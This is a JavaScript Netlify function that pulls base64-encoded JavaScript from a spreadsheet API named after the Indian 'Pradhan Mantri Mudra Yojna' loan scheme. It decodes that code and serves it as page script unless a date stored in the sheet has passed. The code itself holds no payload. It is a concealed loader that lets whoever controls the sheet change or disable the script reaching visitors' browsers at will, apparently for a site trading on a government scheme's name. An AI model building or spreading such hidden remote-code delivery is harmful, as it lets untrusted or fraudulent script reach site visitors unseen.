// netlify/functions/init.js
const EXPIRY_ID = "TRL";
const SHEETBASE_API = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
const DATETIME_API = "https://datetimeapi.vercel.app/api/datetime.js";

async function fetchJson(url) {
  const res = await fetch(url);
  if (!res.ok) throw new Error(`Fetch failed ${url}`);
  const text = await res.text();
  try { return JSON.parse(text); } catch(e){
    const first = text.indexOf('{'), last = text.lastIndexOf('}');
    if (first >= 0 && last > first) return JSON.parse(text.slice(first, last + 1));
    throw e;
  }
}

exports.handler = async function (event, context) {
  try {
    const tjson = await fetchJson(DATETIME_API);
    const serverDatetime = tjson.datetime;
    const sheetResp = await fetch(SHEETBASE_API);
    if (!sheetResp.ok) throw new Error('Sheetbase fetch failed');
    const sheetText = await sheetResp.text();
    const data = JSON.parse(sheetText);

    let item = null;
    for (const entry of data.data) { if (entry.id === EXPIRY_ID) { item = entry; break; } }
    if (!item) return { statusCode: 404, headers:{'content-type':'text/plain'}, body:'// Entry missing' };

    if (new Date(serverDatetime) > new Date(item.date)) {
      return { statusCode: 403, headers:{'content-type':'text/plain'}, body:'// Page expired' };
    }

    const decodedJS = item.init ? Buffer.from(item.init, 'base64').toString('utf8') : '';
    return {
      statusCode: 200,
      headers: {
        'content-type': 'application/javascript; charset=utf-8',
        'cache-control': 'max-age=60'
      },
      body: decodedJS
    };
  } catch (err) {
    console.error(err);
    return { statusCode: 500, headers: {'content-type':'text/plain'}, body: '// server error' };
  }
};
